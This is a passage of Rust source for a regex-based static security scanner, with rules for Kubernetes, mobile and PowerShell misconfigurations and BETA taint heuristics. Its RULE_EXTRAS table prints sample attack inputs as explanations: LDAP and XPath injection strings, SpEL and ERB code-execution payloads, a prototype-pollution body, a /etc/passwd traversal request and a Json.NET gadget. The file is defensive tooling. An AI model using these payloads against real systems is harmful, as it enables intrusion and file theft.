        severity: Severity::Critical,
        confidence: Confidence::High,
        category: "Конфигурация",
        languages: &[Language::Kubernetes, Language::Yaml],
        pattern: r"privileged\s*:\s*true",
        unless_contains: &[],
        cwe: &["CWE-250"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://kubernetes.io/docs/concepts/security/pod-security-standards/"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-K8-002",
        title: "Разрешено повышение привилегий",
        description: "allowPrivilegeEscalation: true позволяет процессу получить больше прав, чем у родителя, через setuid-бинарники.",
        recommendation: "Задайте allowPrivilegeEscalation: false в securityContext.",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "Конфигурация",
        languages: &[Language::Kubernetes, Language::Yaml],
        pattern: r"allowPrivilegeEscalation\s*:\s*true",
        unless_contains: &[],
        cwe: &["CWE-250"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://kubernetes.io/docs/concepts/security/pod-security-standards/"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-K8-003",
        title: "Монтирование хостовой файловой системы",
        description: "hostPath пробрасывает каталог узла в контейнер. Монтирование / или /var/run/docker.sock равносильно выдаче прав root на узле.",
        recommendation: "Используйте PersistentVolume или emptyDir. hostPath оправдан только для системных DaemonSet.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Конфигурация",
        languages: &[Language::Kubernetes, Language::Yaml],
        pattern: r"hostPath\s*:",
        unless_contains: &[],
        cwe: &["CWE-668"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://kubernetes.io/docs/concepts/storage/volumes/#hostpath"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-K8-004",
        title: "Контейнер работает от root",
        description: "runAsUser: 0 запускает процесс от root внутри контейнера, что усиливает последствия любой уязвимости в нём.",
        recommendation: "Задайте runAsNonRoot: true и конкретный runAsUser.",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Конфигурация",
        languages: &[Language::Kubernetes, Language::Yaml],
        pattern: r"runAsUser\s*:\s*0\b|runAsNonRoot\s*:\s*false",
        unless_contains: &[],
        cwe: &["CWE-250"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://kubernetes.io/docs/concepts/security/pod-security-standards/"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-K8-005",
        title: "Под использует пространства имён хоста",
        description: "hostNetwork/hostPID/hostIPC: true снимают изоляцию контейнера от хоста. Процесс видит сеть, процессы или IPC узла — из контейнера легко разведать и атаковать хост и соседей.",
        recommendation: "Уберите hostNetwork/hostPID/hostIPC. Если нужен доступ к сети узла — используйте Service и точечные права.",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "Конфигурация",
        languages: &[Language::Kubernetes, Language::Yaml],
        pattern: r"(?:hostNetwork|hostPID|hostIPC)\s*:\s*true",
        unless_contains: &[],
        cwe: &["CWE-668"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://kubernetes.io/docs/concepts/security/pod-security-standards/"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-K8-006",
        title: "Контейнеру выданы опасные Linux-возможности",
        description: "Добавление SYS_ADMIN, NET_ADMIN, SYS_PTRACE или SYS_MODULE через capabilities.add почти равно привилегированному режиму: с ними можно монтировать ФС, менять сеть, читать чужую память и выходить из контейнера.",
        recommendation: "Не добавляйте эти capabilities. Начните с drop: [ALL] и выдавайте только строго необходимое.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Конфигурация",
        languages: &[Language::Kubernetes, Language::Yaml],
        pattern: r"(?i)\b(?:SYS_ADMIN|NET_ADMIN|SYS_PTRACE|SYS_MODULE|SYS_BOOT|DAC_READ_SEARCH)\b",
        unless_contains: &[],
        cwe: &["CWE-250"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://kubernetes.io/docs/concepts/security/pod-security-standards/"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-K8-007",
        title: "Токен сервис-аккаунта монтируется автоматически",
        description: "automountServiceAccountToken: true кладёт токен API в каждый под. Захватив контейнер, атакующий этим токеном ходит в Kubernetes API с правами сервис-аккаунта.",
        recommendation: "Ставьте automountServiceAccountToken: false там, где под не обращается к API, и выдавайте минимальные RBAC-права.",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Конфигурация",
        languages: &[Language::Kubernetes, Language::Yaml],
        pattern: r"automountServiceAccountToken\s*:\s*true",
        unless_contains: &[],
        cwe: &["CWE-276"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-K8-008",
        title: "Корневая ФС контейнера доступна на запись",
        description: "readOnlyRootFilesystem: false позволяет процессу писать в файловую систему контейнера. Атакующий подменяет бинарники и роняет закладки, которые переживут перезапуск процесса.",
        recommendation: "Ставьте readOnlyRootFilesystem: true, а для временных данных подключайте emptyDir-том.",
        severity: Severity::Low,
        confidence: Confidence::High,
        category: "Конфигурация",
        languages: &[Language::Kubernetes, Language::Yaml],
        pattern: r"readOnlyRootFilesystem\s*:\s*false",
        unless_contains: &[],
        cwe: &["CWE-732"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://kubernetes.io/docs/concepts/security/pod-security-standards/"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-K8-009",
        title: "Образ по плавающему тегу latest",
        description: "Тег latest не фиксирует версию: под может поднять неожиданный или подменённый образ, а откатиться по манифесту нельзя. Это и риск целостности, и риск воспроизводимости.",
        recommendation: "Пиньте образ по неизменяемому дайджесту (image@sha256:...) или по конкретной версии.",
        severity: Severity::Low,
        confidence: Confidence::Medium,
        category: "Конфигурация",
        languages: &[Language::Kubernetes, Language::Yaml],
        pattern: r#"image\s*:\s*["']?\S+:latest\b"#,
        unless_contains: &[],
        cwe: &["CWE-1104"],
        owasp: Some(OWASP_INTEGRITY),
        references: &["https://kubernetes.io/docs/concepts/containers/images/#image-names"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-K8-010",
        title: "Профиль seccomp отключён (Unconfined)",
        description: "seccompProfile type: Unconfined снимает фильтр системных вызовов. Контейнеру снова доступны опасные syscalls, которыми пользуются для побега и эскалации.",
        recommendation: "Используйте seccompProfile type: RuntimeDefault (или собственный профиль).",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Конфигурация",
        languages: &[Language::Kubernetes, Language::Yaml],
        pattern: r"type\s*:\s*[\x22\x27]?Unconfined\b",
        unless_contains: &[],
        cwe: &["CWE-693"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://kubernetes.io/docs/tutorials/security/seccomp/"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-K8-011",
        title: "Контейнер публикует hostPort",
        description: "hostPort привязывает порт контейнера к сетевому интерфейсу узла в обход Service. Служба становится доступна напрямую по IP узла, минуя сетевые политики.",
        recommendation: "Публикуйте приложения через Service/Ingress, а не hostPort.",
        severity: Severity::Low,
        confidence: Confidence::Medium,
        category: "Конфигурация",
        languages: &[Language::Kubernetes, Language::Yaml],
        pattern: r"hostPort\s*:\s*\d+",
        unless_contains: &[],
        cwe: &["CWE-668"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://kubernetes.io/docs/concepts/configuration/overview/"],
        skip_in_tests: false,
    },

    // -------------------------------------------------- Мобильные (Android/iOS)
    Rule {
        id: "VS-JV-026",
        title: "WebView: addJavascriptInterface открывает мост в нативный код",
        description: "addJavascriptInterface даёт JavaScript в WebView вызывать методы Java-объекта. Если загружается недоверенный контент, страница через рефлексию исполняет команды в приложении (на старых Android — прямой RCE).",
        recommendation: "Избегайте моста для недоверенного контента. Помечайте методы @JavascriptInterface, загружайте только доверенные страницы, ограничьте API.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Выполнение кода",
        languages: &[Language::Java, Language::Kotlin],
        pattern: r"\.addJavascriptInterface\s*\(",
        unless_contains: &[],
        cwe: &["CWE-749"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://developer.android.com/reference/android/webkit/WebView#addJavascriptInterface(java.lang.Object,%20java.lang.String)"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JV-027",
        title: "WebView: доступ к файлам из URL включён",
        description: "setAllowUniversalAccessFromFileURLs/setAllowFileAccessFromFileURLs(true) позволяет странице по file:// читать локальные файлы и обходить same-origin. Вредоносный HTML утаскивает данные приложения.",
        recommendation: "Держите оба флага в false. Не смешивайте file:// и удалённый контент в одном WebView.",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "Контроль доступа",
        languages: &[Language::Java, Language::Kotlin],
        pattern: r"setAllow(?:Universal|File)AccessFromFileURLs\s*\(\s*true",
        unless_contains: &[],
        cwe: &["CWE-668"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://developer.android.com/reference/android/webkit/WebSettings#setAllowUniversalAccessFromFileURLs(boolean)"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-JV-028",
        title: "Файл создаётся в режиме WORLD_READABLE/WRITEABLE",
        description: "MODE_WORLD_READABLE и MODE_WORLD_WRITEABLE делают файл или SharedPreferences доступными любому приложению на устройстве. Так утекают токены и настройки, а запись позволяет их подменить.",
        recommendation: "Используйте MODE_PRIVATE. Для обмена данными между приложениями применяйте ContentProvider с правами.",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "Контроль доступа",
        languages: &[Language::Java, Language::Kotlin],
        pattern: r"MODE_WORLD_(?:READABLE|WRITEABLE)",
        unless_contains: &[],
        cwe: &["CWE-276"],
        owasp: Some(OWASP_MISCONFIG),
        references: &["https://developer.android.com/reference/android/content/Context#MODE_WORLD_READABLE"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-SW-005",
        title: "Keychain: элемент доступен без блокировки экрана",
        description: "kSecAttrAccessibleAlways (и ...AlwaysThisDeviceOnly) хранит секрет доступным, даже когда устройство заблокировано. При краже разблокировать телефон не нужно, чтобы вытащить данные.",
        recommendation: "Используйте kSecAttrAccessibleWhenUnlocked или ...WhenPasscodeSetThisDeviceOnly.",
        severity: Severity::Medium,
        confidence: Confidence::High,
        category: "Хранение секретов",
        languages: &[Language::Swift],
        pattern: r"kSecAttrAccessibleAlways",
        unless_contains: &[],
        cwe: &["CWE-311"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://developer.apple.com/documentation/security/ksecattraccessiblewhenunlocked"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-SW-006",
        title: "App Transport Security отключён",
        description: "NSAllowsArbitraryLoads = true снимает ATS и разрешает приложению незашифрованные HTTP-соединения. Трафик становится доступен для перехвата и подмены.",
        recommendation: "Не включайте NSAllowsArbitraryLoads. Ходите по HTTPS; для отдельных доменов используйте точечные исключения.",
        severity: Severity::Medium,
        confidence: Confidence::Medium,
        category: "Транспортная безопасность",
        languages: &[Language::Swift, Language::Xml],
        pattern: r"NSAllowsArbitraryLoads",
        unless_contains: &[],
        cwe: &["CWE-319"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://developer.apple.com/documentation/bundleresources/information_property_list/nsapptransportsecurity"],
        skip_in_tests: false,
    },

    // ------------------------------------------------------------ PowerShell
    Rule {
        id: "VS-PS-001",
        title: "Invoke-Expression с собранной строкой",
        description: "Invoke-Expression исполняет строку как код PowerShell — это прямой аналог eval.",
        recommendation: "Уберите Invoke-Expression. Вызывайте команды напрямую с параметрами через splatting.",
        severity: Severity::High,
        confidence: Confidence::Medium,
        category: "Выполнение кода",
        languages: &[Language::PowerShell],
        pattern: r"\b(?:Invoke-Expression|iex)\s+",
        unless_contains: &[],
        cwe: &["CWE-95"],
        owasp: Some(OWASP_INJECTION),
        references: &["https://cwe.mitre.org/data/definitions/95.html"],
        skip_in_tests: false,
    },
    Rule {
        id: "VS-PS-002",
        title: "Отключена проверка TLS-сертификата",
        description: "SkipCertificateCheck и подмена CertificatePolicy принимают любой сертификат — трафик можно перехватить.",
        recommendation: "Уберите флаг. Для внутреннего CA установите его сертификат в хранилище доверенных.",
        severity: Severity::High,
        confidence: Confidence::High,
        category: "Транспортная безопасность",
        languages: &[Language::PowerShell],
        pattern: r"-SkipCertificateCheck|ServerCertificateValidationCallback\s*=\s*\{\s*\$true",
        unless_contains: &[],
        cwe: &["CWE-295"],
        owasp: Some(OWASP_CRYPTO),
        references: &["https://cwe.mitre.org/data/definitions/295.html"],
        skip_in_tests: false,
    },
];

/// High-value, developer-facing detail attached to select rules by id, so the
/// large `RULES` table above stays untouched. Populated where it matters most —
/// the injection/RCE family — and rendered in the finding detail.
///
/// `sink` is a *corroborating* pattern. The base rule (e.g. an LDAP filter built
/// by string concatenation) is only "potentially dangerous" on its own; when the
/// same file also contains the sink that consumes the value (e.g. a real
/// `DirContext.search(...)` call), the finding is far more likely a true
/// positive, so its confidence is raised a notch and it is marked corroborated.
/// This is a deliberately lightweight, honest substitute for full taint tracking,
/// which a regex engine cannot do.
pub struct RuleExtra {
    pub id: &'static str,
    /// A concrete attacker input and what it does to the query/logic.
    pub exploit: &'static str,
    /// Bullet-point consequences, most severe first.
    pub impact: &'static [&'static str],
    /// A ready-to-paste remediation snippet.
    pub fix_code: &'static str,
    /// Regex; when the scanned file also matches it, confidence is elevated.
    pub sink: Option<&'static str>,
}

pub static RULE_EXTRAS: &[RuleExtra] = &[
    RuleExtra {
        id: "VS-JV-016",
        exploit: "Ввод username = *)(uid=* превращает фильтр «(uid=» + username + «)» в (uid=*)(uid=*): звёздочка совпадает с любым пользователем, а лишние скобки меняют структуру фильтра.",
        impact: &[
            "Обход аутентификации (вход без корректного пароля)",
            "Перечисление и чтение чужих записей каталога (LDAP enumeration)",
            "Раскрытие атрибутов, к которым не должно быть доступа",
        ],
        fix_code: "String safe = com.unboundid.ldap.sdk.Filter.encodeValue(username);\n// либо org.springframework.ldap: LdapEncoder.filterEncode(username)\nString filter = \"(uid=\" + safe + \")\";",
        sink: Some(r"(?:DirContext|InitialLdapContext|LdapContext|LdapTemplate|NamingEnumeration)|\.search\s*\("),
    },
    RuleExtra {
        id: "VS-PY-031",
        exploit: "Ввод username = *)(uid=* даёт фильтр (uid=*)(uid=*) — звёздочка совпадает со всеми, а скобки меняют логику фильтра.",
        impact: &[
            "Обход аутентификации",
            "Перечисление записей каталога (LDAP enumeration)",
            "Раскрытие чужих атрибутов",
        ],
        fix_code: "import ldap.filter\nsafe = ldap.filter.escape_filter_chars(username)\nflt = \"(uid=\" + safe + \")\"",
        sink: Some(r"\.search(?:_s|_st|_ext)?\s*\(|ldap3?\."),
    },
    RuleExtra {
        id: "VS-JV-017",
        exploit: "Ввод name = ' or '1'='1 превращает /users/user[name='...'] в выражение, которое всегда истинно и возвращает всех пользователей.",
        impact: &[
            "Обход проверки (возврат чужого пользователя)",
            "Чтение произвольных узлов XML-документа",
            "Раскрытие данных, скрытых за фильтром",
        ],
        fix_code: "XPath xp = XPathFactory.newInstance().newXPath();\nxp.setXPathVariableResolver(v -> name);\nxp.evaluate(\"/users/user[name=$name]\", doc);",
        sink: Some(r"\.(?:evaluate|compile|selectNodes|selectSingleNode)\s*\("),
    },
    RuleExtra {
        id: "VS-JV-018",
        exploit: "Ввод T(java.lang.Runtime).getRuntime().exec('calc') компилируется как Spring EL и выполняется — это выполнение произвольного кода.",
        impact: &[
            "Выполнение произвольного кода на сервере (RCE)",
            "Доступ к любым бинам и статическим методам JVM",
            "Полная компрометация приложения",
        ],
        fix_code: "SimpleEvaluationContext ctx = SimpleEvaluationContext\n    .forReadOnlyDataBinding().build();\nparser.parseExpression(fixedTemplate).getValue(ctx);",
        sink: None,
    },
    RuleExtra {
        id: "VS-RB-009",
        exploit: "Ввод <%= system('id') %> в params[:template] компилируется ERB и выполняется как Ruby — это RCE.",
        impact: &[
            "Выполнение произвольного кода на сервере (RCE)",
            "Чтение и запись файлов от имени приложения",
            "Полная компрометация процесса",
        ],
        fix_code: "# Не собирайте шаблон из ввода. Статичный шаблон + локальные переменные:\nERB.new(File.read(\"views/page.erb\")).result_with_hash(name: params[:name])",
        sink: None,
    },
    RuleExtra {
        id: "VS-JS-032",
        exploit: "Тело запроса {\"__proto__\":{\"isAdmin\":true}} при рекурсивном слиянии пишет isAdmin в Object.prototype — свойство появляется у всех объектов.",
        impact: &[
            "Обход проверок доступа (свойство «всплывает» везде)",
            "Порча логики приложения и отказ в обслуживании",
            "Иногда — выполнение кода через загрязнённые gadget-свойства",
        ],
        fix_code: "if (key === '__proto__' || key === 'constructor' || key === 'prototype') continue;\n// либо: используйте Map, или Object.create(null) для словарей",
        sink: None,
    },
    RuleExtra {
        id: "VS-GO-011",
        exploit: "Запрос GET /..%2f..%2fetc/passwd проходит в r.URL.Path и ServeFile отдаёт /etc/passwd за пределами каталога.",
        impact: &[
            "Чтение произвольных файлов сервера (path traversal)",
            "Утечка конфигов, ключей и исходников",
        ],
        fix_code: "clean := filepath.Clean(\"/\" + r.URL.Path)\np := filepath.Join(root, clean)\nif !strings.HasPrefix(p, root) { http.Error(w, \"\", 400); return }\nhttp.ServeFile(w, r, p)",
        sink: None,
    },
    RuleExtra {
        id: "VS-CS-011",
        exploit: "JSON вида {\"$type\":\"System.Windows.Data.ObjectDataProvider, ...\"} заставляет Json.NET создать gadget-тип и выполнить код при десериализации.",
        impact: &[
            "Выполнение произвольного кода при десериализации (RCE)",
            "Создание произвольных типов из недоверенных данных",
        ],
        fix_code: "var settings = new JsonSerializerSettings {\n    TypeNameHandling = TypeNameHandling.None\n};",
        sink: None,
    },
];

/// Compiled `sink` patterns, keyed by rule id, built once.
static SINK_REGEXES: Lazy<Vec<(&'static str, Regex)>> = Lazy::new(|| {
    RULE_EXTRAS
        .iter()
        .filter_map(|e| e.sink.map(|s| (e.id, Regex::new(s).expect("bad sink pattern"))))
        .collect()
});

pub fn extra_for(id: &str) -> Option<&'static RuleExtra> {
    RULE_EXTRAS.iter().find(|e| e.id == id)
}

/// True when the rule has a corroborating sink and the file content matches it.
pub fn sink_present(id: &str, content: &str) -> bool {
    SINK_REGEXES
        .iter()
        .find(|(rid, _)| *rid == id)
        .map(|(_, re)| re.is_match(content))
        .unwrap_or(false)
}

// ---------------------------------------------------------------------------
// Experimental (BETA) heuristics.
//
// A precise rule says "this exact pattern is dangerous". A heuristic says "user
// input and a dangerous call appear on the same line — this *might* be
// exploitable". It fires only on lines the precise catalogue did not already
// flag, so it surfaces *suspected* issues the rules missed, at low confidence
// and clearly labelled BETA. This is taint-lite: real, useful, and honest about
// being a guess rather than a proof.

const HEUR_LANGS: &[Language] = &[
    Language::Python,
    Language::JavaScript,
    Language::TypeScript,
    Language::Jsx,
    Language::Tsx,
    Language::Php,
    Language::Ruby,
    Language::Java,
    Language::Kotlin,
    Language::Go,
    Language::CSharp,
    Language::Scala,
    Language::Perl,
    Language::Elixir,
];

pub struct Heuristic {
    pub id: &'static str,
    pub title: &'static str,
    pub description: &'static str,
    pub recommendation: &'static str,
    pub severity: Severity,
    pub category: &'static str,
    pub languages: &'static [Language],
    /// A user-input indicator; must be present on the line.
    pub taint: &'static str,
    /// A dangerous call; must be present on the same line.
    pub sink: &'static str,
    pub cwe: &'static [&'static str],
}

/// Shared user-input indicator: request objects, CGI superglobals, argv, stdin.
const TAINT: &str = r#"(?i)(?:\b(?:req|request|params?|argv|body|cookie|user_?input|stdin|form_?data|payload)\b|\$_(?:GET|POST|REQUEST|COOKIE)|\binput\s*\(|getenv\s*\(|process\.argv|readLine\s*\(|Console\.Read)"#;

pub static HEURISTICS: &[Heuristic] = &[
    Heuristic {
        id: "VS-EXP-001",
        title: "Возможная инъекция команд",
        description: "В одной строке встречаются пользовательский ввод и запуск системной команды. Если ввод попадает в команду без экранирования, это инъекция команд ОС. Это эвристика (BETA): точное правило здесь не сработало, проверьте поток данных вручную.",
        recommendation: "Убедитесь, что ввод не попадает в команду. Запускайте процессы с массивом аргументов без шелла и с белым списком.",
        severity: Severity::Medium,
        category: "Инъекция команд",
        languages: HEUR_LANGS,
        taint: TAINT,
        sink: r"(?i)\b(?:system|popen|shell_exec|passthru|proc_open|pcntl_exec|Runtime\.getRuntime|ProcessBuilder|subprocess\.(?:call|run|Popen|check_output)|os\.system|child_process\.\w+|exec(?:File|Sync)?)\s*\(",
        cwe: &["CWE-78"],
    },
    Heuristic {
        id: "VS-EXP-002",
        title: "Возможная SQL-инъекция",
        description: "В одной строке встречаются пользовательский ввод и выполнение SQL-запроса. Если ввод склеивается в текст запроса, это SQL-инъекция. Это эвристика (BETA): проверьте, используется ли параметризация.",
        recommendation: "Используйте параметризованные запросы (placeholders), а не конкатенацию/интерполяцию ввода в SQL.",
        severity: Severity::High,
        category: "SQL-инъекция",
        languages: HEUR_LANGS,
        taint: TAINT,
        sink: r"(?i)\.(?:execute|executemany|query|rawQuery|exec|prepare|raw)\s*\(",
        cwe: &["CWE-89"],
    },
    Heuristic {
        id: "VS-EXP-003",
        title: "Возможный path traversal",
        description: "В одной строке встречаются пользовательский ввод и открытие файла. Если имя файла задаёт пользователь, через ../ он выйдет за пределы каталога. Это эвристика (BETA): проверьте, ограничен ли путь.",
        recommendation: "Сопоставляйте имя с белым списком или берите только basename и фиксируйте базовый каталог; проверяйте результат после нормализации пути.",
        severity: Severity::Medium,
        category: "Path traversal",
        languages: HEUR_LANGS,
        taint: TAINT,
        sink: r"(?i)\b(?:open|fopen|readFile(?:Sync)?|createReadStream|File\.(?:read|open|new)|FileInputStream|Paths\.get|sendFile|send_file|readlink)\s*\(",
        cwe: &["CWE-22"],
    },
    Heuristic {
        id: "VS-EXP-004",
        title: "Возможный SSRF",
        description: "В одной строке встречаются пользовательский ввод и исходящий HTTP-запрос. Если адрес задаёт пользователь, сервер сходит куда угодно — вплоть до внутренних сервисов и метаданных облака. Это эвристика (BETA).",
        recommendation: "Проверяйте и ограничивайте целевой адрес белым списком доменов/сетей; запрещайте приватные диапазоны и редиректы на них.",
        severity: Severity::Medium,
        category: "SSRF",
        languages: HEUR_LANGS,
        taint: TAINT,
        sink: r"(?i)\b(?:requests\.(?:get|post|put|delete|head)|urlopen|urlretrieve|fetch|axios|HttpClient|WebClient|OkHttp|http\.(?:Get|Post|get|post)|URLConnection)\s*[.(]",
        cwe: &["CWE-918"],
    },
    Heuristic {
        id: "VS-EXP-005",
        title: "Возможное выполнение кода",
        description: "В одной строке встречаются пользовательский ввод и eval/exec-подобный вызов. Если ввод исполняется как код или десериализуется небезопасно, это выполнение произвольного кода. Это эвристика (BETA).",
        recommendation: "Не исполняйте и не десериализуйте пользовательские данные. Используйте безопасные парсеры и белые списки.",
        severity: Severity::High,
        category: "Выполнение кода",
        languages: HEUR_LANGS,
        taint: TAINT,
        sink: r"(?i)\b(?:eval|exec|compile|new\s+Function|pickle\.loads?|cPickle\.loads?|yaml\.(?:load|full_load|unsafe_load)|marshal\.loads?|Marshal\.load)\s*\(",
        cwe: &["CWE-94"],
    },
];

static TAINT_RE: Lazy<Regex> = Lazy::new(|| Regex::new(TAINT).expect("bad TAINT"));

/// Cheap gate: if a file has no user-input indicator at all, no heuristic can
/// fire, so the per-line pass is skipped entirely.
pub fn content_has_taint(content: &str) -> bool {
    TAINT_RE.is_match(content)
}

static HEURISTIC_RE: Lazy<Vec<(Regex, Regex)>> = Lazy::new(|| {
    HEURISTICS
        .iter()
        .map(|h| {
            (
                Regex::new(h.taint).expect("bad heuristic taint"),
                Regex::new(h.sink).expect("bad heuristic sink"),
            )
        })
        .collect()
});

/// Heuristics whose taint *and* sink both match this single line, for `lang`.
pub fn line_heuristics(line: &str, lang: Language) -> Vec<&'static Heuristic> {
    HEURISTICS
        .iter()
        .enumerate()
        .filter(|(i, h)| {
            h.languages.contains(&lang) && {
                let (taint, sink) = &HEURISTIC_RE[*i];
                taint.is_match(line) && sink.is_match(line)
            }
        })
        .map(|(_, h)| h)
        .collect()
}

pub struct CompiledRule {
    pub index: usize,
    pub regex: Regex,
}

struct LanguageBundle {
    set: RegexSet,
    rules: Vec<CompiledRule>,
}

/// Rules are grouped per language and pre-filtered with a `RegexSet`, so a file
/// only pays for the individual patterns that actually matched somewhere.
static BUNDLES: Lazy<HashMap<Language, LanguageBundle>> = Lazy::new(|| {
    let mut by_lang: HashMap<Language, Vec<usize>> = HashMap::new();
    for (i, rule) in RULES.iter().enumerate() {
        for lang in rule.languages {
            by_lang.entry(*lang).or_default().push(i);
        }
    }

    by_lang
        .into_iter()
        .map(|(lang, indices)| {
            let patterns: Vec<&str> = indices.iter().map(|&i| RULES[i].pattern).collect();
            let set = RegexSet::new(&patterns).unwrap_or_else(|e| {
                panic!("invalid rule pattern for {:?}: {e}", lang);
            });
            let rules = indices
                .iter()
                .map(|&i| CompiledRule {
                    index: i,
                    regex: Regex::new(RULES[i].pattern).expect("pattern already validated"),
                })
                .collect();
            (lang, LanguageBundle { set, rules })
        })
        .collect()
});

pub struct RuleHit {
    pub rule: &'static Rule,
    pub start: usize,
    pub end: usize,
}

fn is_test_path(rel_path: &str) -> bool {
    let p = rel_path.to_ascii_lowercase();
    p.contains("/test")
        || p.starts_with("test")
        || p.contains("/spec")
        || p.contains("__tests__")
        || p.contains("/fixtures/")
        || p.contains("/mocks/")
        || p.ends_with("_test.py")
        || p.ends_with("_test.rs")
        || p.ends_with(".test.js")
        || p.ends_with(".test.ts")
        || p.ends_with(".test.tsx")
        || p.ends_with(".spec.js")
        || p.ends_with(".spec.ts")
        || p.ends_with("conftest.py")
}

/// Exposed so user rules get the same test-path suppression as built-ins.
pub fn path_is_test(rel_path: &str) -> bool {
    is_test_path(rel_path)
}

/// Exposed so user rules skip commented-out code exactly like built-ins do.
pub fn is_comment_line(line: &str, lang: Language) -> bool {
    line_is_comment(line, lang)
}

/// True for lines that are entirely a comment. Cheap approximation: findings in
/// commented-out code are noise, not vulnerabilities.
fn line_is_comment(line: &str, lang: Language) -> bool {
    let t = line.trim_start();
    match lang {
        // Hash-comment family.
        Language::Python
        | Language::Shell
        | Language::PowerShell
        | Language::Perl
        | Language::Ruby
        | Language::Elixir
        | Language::Yaml
        | Language::Kubernetes
        | Language::Dockerfile
        | Language::Terraform
        | Language::Toml
        | Language::Ini
        | Language::Makefile
        | Language::Nginx
        | Language::GraphQL
        | Language::Env => t.starts_with('#'),

        // C-comment family. A leading `*` catches continuation lines of a
        // /* ... */ block, which is where most false positives hide.
        Language::Rust
        | Language::JavaScript
        | Language::TypeScript
        | Language::Jsx
        | Language::Tsx
        | Language::Vue
        | Language::Svelte
        | Language::Go
        | Language::Java
        | Language::Kotlin
        | Language::Scala
        | Language::CSharp
        | Language::C
        | Language::Cpp
        | Language::Swift
        | Language::Php => t.starts_with("//") || t.starts_with('*') || t.starts_with("/*"),

        Language::Sql => t.starts_with("--") || t.starts_with("/*"),
        Language::Lua => t.starts_with("--"),
        Language::Html | Language::Xml => t.starts_with("<!--"),

        _ => false,
    }
}

/// Runs every rule registered for `lang` against `content`.
pub fn scan_content(content: &str, lang: Language, rel_path: &str) -> Vec<RuleHit> {
    let Some(bundle) = BUNDLES.get(&lang) else {
        return Vec::new();
    };

    let matched: Vec<usize> = bundle.set.matches(content).into_iter().collect();
    if matched.is_empty() {
        return Vec::new();
    }

    let in_tests = is_test_path(rel_path);
    let mut hits = Vec::new();

    for local_idx in matched {
        let compiled = &bundle.rules[local_idx];
        let rule = &RULES[compiled.index];

        if in_tests && rule.skip_in_tests {
            continue;
        }

        for m in compiled.regex.find_iter(content) {
            let text = m.as_str();

            // "match X unless Y" — checked against the surrounding line, since the
            // exclusion often sits just outside the match itself.
            let line_start = content[..m.start()].rfind('\n').map(|i| i + 1).unwrap_or(0);
            let line_end = content[m.end()..]
                .find('\n')
                .map(|i| m.end() + i)
                .unwrap_or(content.len());
            let line = &content[line_start..line_end];

            if !rule.unless_contains.is_empty() {
                let hay = format!("{} {}", text, line).to_ascii_lowercase();
                if rule
                    .unless_contains
                    .iter()
                    .any(|needle| hay.contains(&needle.to_ascii_lowercase()))
                {
                    continue;
                }
            }

            if line_is_comment(line, lang) {
                continue;
            }

            hits.push(RuleHit {
                rule,
                start: m.start(),
                end: m.end(),
            });
        }
    }

    hits
}

#[cfg(test)]
mod tests {
    use super::*;

    fn hit_ids(code: &str, lang: Language, path: &str) -> Vec<&'static str> {
        let mut ids: Vec<&str> = scan_content(code, lang, path)
            .iter()
            .map(|h| h.rule.id)
            .collect();
        ids.sort_unstable();
        ids.dedup();
        ids
    }

    #[test]
    fn every_rule_pattern_compiles() {
        // Forces the lazy bundles to build; a bad pattern panics here rather
        // than mid-scan in front of a user.
        assert!(!BUNDLES.is_empty());
        for rule in RULES {
            assert!(
                Regex::new(rule.pattern).is_ok(),
                "rule {} has an invalid pattern",
                rule.id
            );
        }
    }

    #[test]
    fn rule_ids_are_unique() {
        let mut ids: Vec<&str> = RULES.iter().map(|r| r.id).collect();
        ids.sort_unstable();
        let before = ids.len();
        ids.dedup();
        assert_eq!(before, ids.len(), "duplicate rule id");
    }

    #[test]
    fn finds_python_shell_injection() {
        let code = "import subprocess\nsubprocess.run(cmd, shell=True)\n";
        assert!(hit_ids(code, Language::Python, "app.py").contains(&"VS-PY-003"));
    }

    #[test]
    fn finds_python_sql_fstring() {
        let code = "cursor.execute(f\"SELECT * FROM users WHERE id = {uid}\")\n";
        assert!(hit_ids(code, Language::Python, "db.py").contains(&"VS-PY-008"));
    }

    #[test]
    fn yaml_safe_loader_is_not_flagged() {
        let safe = "data = yaml.load(text, Loader=yaml.SafeLoader)\n";
        assert!(!hit_ids(safe, Language::Python, "c.py").contains(&"VS-PY-007"));

        let unsafe_call = "data = yaml.load(text)\n";
        assert!(hit_ids(unsafe_call, Language::Python, "c.py").contains(&"VS-PY-007"));
    }

    #[test]
    fn sanitized_inner_html_is_not_flagged() {
